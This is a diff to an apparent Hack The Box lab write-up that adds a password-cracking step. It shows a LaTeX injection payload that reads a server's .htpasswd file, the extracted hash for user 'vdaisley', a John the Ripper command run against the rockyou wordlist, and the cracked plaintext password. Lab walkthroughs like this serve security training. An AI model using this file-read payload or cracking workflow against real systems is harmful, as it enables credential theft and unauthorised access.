@@ -41,3 +41,13 @@ $\lstinputlisting{/var/www/dev/.htpasswd}$
 Credentials:
 vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0
 ```
+
+Crack Password
+```
+john --wordlist=/usr/share/wordlists/rockyou.txt passwd.txt  
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/4c35748f-271b-4da8-bca4-3aeb6b61b715)
+```
+Cracked Password: calculus20
+```
+
